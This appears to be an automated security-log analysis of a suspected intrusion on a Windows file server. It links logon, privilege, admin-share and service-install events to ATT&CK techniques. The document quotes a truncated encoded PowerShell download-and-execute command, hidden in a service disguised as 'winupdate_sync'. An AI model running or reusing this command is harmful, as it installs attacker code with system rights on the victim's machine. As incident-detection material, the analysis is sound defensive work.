text: At 2026-05-16T14:33:11, Windows Security Event 4624 on FS01.corp.local recorded a successful network (remote file share or named pipe) logon for user "CORP\svc_backup" from IP 10.20.14.55 (workstation: WS-224) using NTLM. Authentication used NTLM rather than Kerberos for a network logon, which may indicate pass-the-hash or legacy authentication (T1550.002 (Use Alternate Authentication Material: Pass the Hash)). At 2026-05-16T14:33:11, Event 4672 recorded that user "svc_backup" was assigned sensitive privileges: SeDebugPrivilege, SeImpersonatePrivilege, SeTcbPrivilege. SeDebugPrivilege allows reading memory of other processes (used by credential dumpers like Mimikatz); SeImpersonatePrivilege enables token impersonation attacks. This is a high-risk privilege assignment. At 2026-05-16T14:33:15, user "svc_backup" accessed network share "\\*\ADMIN$" from IP 10.20.14.55. Access to administrative shares (ADMIN$, C$) is commonly used for lateral movement via PsExec or similar tools (T1021.002 (Remote Services: SMB/Windows Admin Shares)). At 2026-05-16T14:33:14, a new service "winupdate_sync" was installed with image path "cmd.exe /c powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAb" running as "LocalSystem". The service command contains encoded PowerShell, a strong indicator of malware persistence via service installation (T1059.001 (Command and Scripting Interpreter: PowerShell)). The combination of privileged logon, sensitive privilege assignment, and administrative share access on FS01.corp.local is consistent with lateral movement and post-exploitation activity by a threat actor with valid credentials.
